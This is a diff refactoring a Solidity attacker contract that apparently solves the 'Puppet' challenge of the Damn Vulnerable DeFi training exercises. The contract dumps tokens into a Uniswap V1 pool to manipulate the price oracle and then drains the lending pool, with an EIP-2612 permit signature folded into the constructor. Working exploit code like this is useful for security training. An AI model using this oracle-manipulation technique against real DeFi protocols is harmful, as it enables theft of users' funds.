@@ -1,53 +1,47 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
-
 import "./PuppetPool.sol";
 import "../DamnValuableToken.sol";
 
 interface IUniswapV1 {
-    function tokenToEthSwapInput(uint tokenSold, uint minEth, uint deadline) external returns (uint);
+    function tokenToEthSwapInput(
+        uint tokenSold,
+        uint minEth,
+        uint deadline
+    ) external returns (uint);
 }
 
 contract PuppetAttacker {
 
-    using ECDSA for bytes32;
+    constructor(
+        address _uniswapPool,
+        address _lendingPool,
+        address _token,
+        uint8 v,
+        bytes32 r,
+        bytes32 s
+    ) payable {
+        address owner = msg.sender;
+        PuppetPool lendingPool = PuppetPool(_lendingPool);
+        DamnValuableToken token = DamnValuableToken(_token);
 
-    address public immutable owner;
-    address public immutable uniswapPool;
-    PuppetPool public lendingPool;
-    DamnValuableToken public token;
+        address spender = address(this);
+        uint256 value = 1000 ether;
+        uint256 deadline = type(uint256).max;
+        token.permit(owner, spender, value, deadline, v, r, s);
 
-    uint256 internal immutable INITIAL_CHAIN_ID;
-    
-    constructor(address _uniswapPool, address _lendingPool, address _token) payable {
-        owner = msg.sender;
-        uniswapPool = _uniswapPool;
-        lendingPool = PuppetPool(_lendingPool);
-        token = DamnValuableToken(_token);
-
-        INITIAL_CHAIN_ID = block.chainid;
-    }
-
-    function executeApproval() public {
-        // Transfer DVT tokens from sender to contract
-        // TO DO: call permit() on token instead, in replacement of approve()
-
+        // Transfer User's DVT Tokens to this contract
         token.transferFrom(msg.sender, address(this), 1000 ether);
-        exploit();
-    }
 
-    function exploit() public {
         // Approve Uniswap contract to transfer DVT tokens
-        token.approve(uniswapPool, 1000 ether);
-
+        token.approve(_uniswapPool, 1000 ether);
         // Swap the DVT tokens in return for ETH
-        uint tokensReceived = IUniswapV1(uniswapPool).tokenToEthSwapInput(
-            1000 ether, 
-            9 ether, block.timestamp * 2
+        uint tokensReceived = IUniswapV1(_uniswapPool).tokenToEthSwapInput(
+            1000 ether,
+            9 ether,
+            block.timestamp * 2
         );
-
         // Borrow the max amount from the lending pool
         lendingPool.borrow{value: address(this).balance}(100000 ether, owner);
     }
